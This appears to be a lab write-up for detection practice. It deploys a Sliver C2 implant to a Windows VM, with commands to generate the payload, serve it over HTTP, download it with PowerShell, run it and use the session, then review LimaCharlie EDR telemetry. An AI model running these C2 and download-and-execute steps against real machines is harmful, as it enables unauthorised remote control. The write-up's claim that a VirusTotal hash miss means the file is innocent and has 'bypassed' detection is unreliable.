1️⃣ Generating the C2 Payload

Jump into an SSH session on the Linux VM (same as Part 1).

  a)Switch to the root user and navigate to the Sliver installation directory:
  ```bash
    sudo su
    cd /opt/sliver
```
![Screenshot (654)](https://github.com/user-attachments/assets/c9ecf990-1cc0-433f-928a-75f349e661c5)

  b)Start the Sliver C2 server:
  ```bash
sliver-server
```
  c)Generate a new Sliver payload (replace [Linux_VM_IP] with your actual Linux VM IP):
  ```bash
generate --http [Linux_VM_IP] --save /opt/sliver
```
  d)Confirm that the payload was generated correctly:
  ```bash
implants
```
![Screenshot (655)](https://github.com/user-attachments/assets/c6fb12be-0729-4d66-9335-8d0bcf49f4ce)

2️⃣ Transferring the C2 Payload to Windows VM

To easily transfer the payload from Linux → Windows, we’ll spin up a simple HTTP server on the Linux VM:

a)Navigate to the Sliver directory and start a Python web server:
```bash
cd /opt/sliver
python3 -m http.server 80
```
![Screenshot (657)](https://github.com/user-attachments/assets/104a996d-4435-4f12-be11-18fa5c8578aa)

b)On the Windows VM, download the payload using PowerShell (replace [Linux_VM_IP] and [payload_name] with actual values):
```bash
IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
```
3️⃣ Starting the Command & Control Session

1)Stop the Python web server on the Linux VM (Press Ctrl + C).

2)Restart the Sliver server:
```bash
sliver-server
```
3)Start the Sliver HTTP listener:
```bash
http
```
![Screenshot (658)](https://github.com/user-attachments/assets/93bbcc1a-3c84-4f07-b6a2-6b19a767803d)

4)On the Windows VM, execute the C2 payload from the Downloads folder (must be run as Administrator):
```bash
C:\Users\User\Downloads\<your_C2-implant>.exe
```

4️⃣ Interacting with the C2 Session

Once the implant session is active, interact with it:
1)List active sessions (find your session ID):
```bash
sessions
```
![Screenshot (659)](https://github.com/user-attachments/assets/f0a096b9-b88d-4427-96bb-55efa7bc711d)

2)Use the active session (replace [session_id] with yours):
```bash
use session[id]
```
3)Find out the user running the implant and their privileges:
```bash
whoami
getprivs
```
![Screenshot (660)](https://github.com/user-attachments/assets/1b3f3dba-04e3-4c92-b860-8dbf04974f8a)

4)List running processes on the Windows VM:
```bash
ps -T
```
![Screenshot (662)](https://github.com/user-attachments/assets/e342896c-8188-498e-b4e6-2304ea22b20a)

5️⃣ Observing EDR Telemetry in LimaCharlie
1)Go to LimaCharlie Dashboard → Click "Sensors" on the left menu.

![Screenshot (663)](https://github.com/user-attachments/assets/c5b9cbb5-d021-4062-a9d4-99fe77dbaf56)

2)Click on the Windows sensor (your victim machine).

3)Check for malicious activity:
a)Click "Processes" to view running processes.

![Screenshot (664)](https://github.com/user-attachments/assets/e48475e8-8fae-4ff7-83bc-666bb9e15948)

b)Click "Network" to analyze connections.

c)Click "File System" to inspect file changes.

![Screenshot (666)](https://github.com/user-attachments/assets/201d0a84-b3f0-4c4e-951f-9ead078eeb41)

d)Scan the payload’s hash using VirusTotal.

![Screenshot (669)](https://github.com/user-attachments/assets/5ad1a658-ab8c-4b88-87c6-ff27da3e53f5)

As you  can see above no file found in the Virus Total means our virus file is innocent in terms can virus and it is bypassed by the virus total.

e)Click “Timeline” to view real-time logs streaming from the Windows VM.


![Screenshot (670)](https://github.com/user-attachments/assets/2113673b-4532-4775-b9f8-ee595fb816ef)

